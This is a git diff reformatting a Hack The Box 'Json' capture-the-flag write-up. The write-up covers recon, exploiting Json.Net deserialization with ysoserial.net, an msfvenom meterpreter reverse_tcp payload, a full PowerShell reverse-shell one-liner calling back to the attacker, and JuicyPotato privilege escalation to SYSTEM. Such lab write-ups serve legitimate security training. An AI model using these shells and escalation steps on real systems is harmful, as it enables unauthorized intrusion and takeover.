@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Json"
-date:   2020-02-16 01:41:00 +0800
-categories: hackthebox
-tags: windows json.net juicypotato
+title: Hack The Box - Json
+date: 2020-02-16 01:41:00 +0800
+categories: [hackthebox]
+tags: [windows, json.net, juicypotato]
 ---
 
 ![](/assets/images/json.png){:height="414px" width="615px"}
@@ -14,14 +13,14 @@ The operating systems that I will be using to tackle this machine is a Kali Linu
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.158 json.htb" >> /etc/hosts
-{% endhighlight %} 
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC json.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 23:17 EST
 Nmap scan report for json.htb (10.10.10.158)
@@ -65,7 +64,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 82.99 seconds
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
@@ -85,7 +84,7 @@ Among the requests sent during the login, there was a suspicous `GET` request be
 
 The response was:
 
-{% highlight raw %}
+```
 { 
     "Id":1,
     "UserName":"admin",
@@ -93,13 +92,13 @@ The response was:
     "Name":"User Admin HTB",
     "Rol":"Administrator"
 }
-{% endhighlight %}
+```
 
 No requests parameters were sent so maybe the `OAuth2` token in the `Bearer` header has something to do with it? The session value also had the same value for some reason. When to `base64`-decoding it, we got the same exact content as the response.
 
 Lets try to cause some `base64`-decoding issues and hopefully see some errors :)
 
-{% highlight python %}
+```python
 import base64
 import requests
 
@@ -109,19 +108,19 @@ headers = {
 
 resp = requests.get("http://json.htb/api/Account/", headers=headers)
 print(resp.content)
-{% endhighlight %}
+```
 
 Running the above script got:
-{% highlight raw %}
+```
 b'{"Message":"An error has occurred.","ExceptionMessage":"Cannot deserialize Json.Net Object","ExceptionType":"System.Exception","StackTrace":null}'
-{% endhighlight %}
+```
 
 `Json.Net`? Didn't know how to exploit but I came across this [tool](https://github.com/pwntester/ysoserial.net) that is able to generate some sort of payload to execute commands ? What was neat was that the first example actually suited our needs and all we have to do is change the command executed.
 
 # Exploitation (1)
 
 First, we need to generate our `meterpreter` payload and serve it using `SimpleHTTPServer` on port 80.
-{% highlight bash %}
+```bash
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=XXXX -f exe > shell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -130,10 +129,10 @@ Payload size: 341 bytes
 Final size of exe file: 73802 bytes
 $ python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
-{% endhighlight %}
+```
 
 Next, we set up our reverse shell handler using `msfconsole`:
-{% highlight bash %}
+```bash
 $ msfconsole
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set LHOST 10.10.XX.XX
@@ -144,10 +143,10 @@ msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
 msf5 exploit(multi/handler) > run                                                                            
 [*] Started reverse TCP handler on 10.10.XX.XX:XXXX
-{% endhighlight %}
+```
 
 And now our exploit script to pull everything together:
-{% highlight python %}
+```python
 import base64
 import requests
 import json
@@ -182,20 +181,20 @@ for command in commands:
 	}
 
 	resp = requests.get("http://json.htb/api/Account/", headers=headers)
-{% endhighlight %}
+```
 
 Running the script got us our session ! :)
 
-{% highlight raw %}
+```
 [*] Sending stage (180291 bytes) to 10.10.10.158
 [*] Meterpreter session 1 opened (10.10.XX.XX:XXXX -> 10.10.10.158:52355) at 2020-02-15 09:29:17 -0500
 meterpreter > getuid
 Server username: JSON\userpool
-{% endhighlight %}
+```
     
 # user.txt
 
-{% highlight raw %}
+```
 meterpreter > shell
 Process 676 created.
 Channel 1 created.
@@ -204,13 +203,13 @@ Microsoft Windows [Version 6.3.9600]
 
 c:\windows\system32\inetsrv>more C:\Users\userpool\Destkop\user.txt
 3445XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
 If we look at what privileges we have as `userpool`,
 
-{% highlight raw %}
+```
 c:\windows\system32\inetsrv>whoami /priv
 PRIVILEGES INFORMATION
 ----------------------
@@ -223,35 +222,35 @@ SeAuditPrivilege              Generate security audits                  Disabled
 SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
-{% endhighlight %}
+```
 
 According to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md), if we got `SeImpersonate` or  `SeAssignPrimaryToken` privileges (which is this case we have both), we can use [`Juicy Potato`](https://github.com/ohpe/juicy-potato).
 
 First we create a `.bat` script to run a `Powershell` command that connects back to us.
-{% highlight raw %}
+```
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.XX.XX',XXXX); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; $client.Close()"
-{% endhighlight %}
+```
 
 Then we use `meterpreter` to upload the files to the box:
-{% highlight raw %}
+```
 meterpreter > upload /root/Desktop/web/x.bat C:\\tmp
 [*] uploading  : /root/Desktop/web/x.bat -> C:\tmp
 [*] uploaded   : /root/Desktop/web/x.bat -> C:\tmp\x.bat
 meterpreter > upload /root/Desktop/web/JuicyPotato.exe C:\\tmp
 [*] uploading  : /root/Desktop/web/JuicyPotato.exe -> C:\tmp
 [*] uploaded   : /root/Desktop/web/JuicyPotato.exe -> C:\tmp\JuicyPotato.exe
-{% endhighlight %}
+```
 
 Next we start a listener on our machine:
-{% highlight bash %}
+```bash
 $ nc -lvnp XXXX
 listening on [any] XXXX ...
-{% endhighlight %}
+```
 
 To use `JuicyPotato.exe`, we need to know the `CLSID` based on the box's Windows version `Microsoft Windows Server 2012 R2 Datacenter` (The version can be retrieved by running `systeminfo` on the box.). The CLSID can be gotten from [here](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/). Make sure the User belonging to the CLSID you have chosen is `NT AUTHORITY/SYSTEM`.
 
 The last step would be to run `JuicyPotato.exe` on the box.
-{% highlight raw %}
+```
 c:\tmp> JuicyPotato.exe -l XXXX -p c:\tmp\x.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} XXXX
 ....
@@ -259,20 +258,20 @@ Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} XXXX
 {e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM
 
 [+] CreateProcessWithTokenW OK
-{% endhighlight %}
+```
 
 On our listener, we caught the connection:
-{% highlight raw %}
+```
 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.158] 52604
 PS C:\Windows\system32> whoami
 nt authority\system
-{% endhighlight %}
+```
 
 # root.txt
 
-{% highlight raw %}
+```
 PS C:\Windows\system32> more C:\Users\superadmin\Desktop\root.txt
 3cc8XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
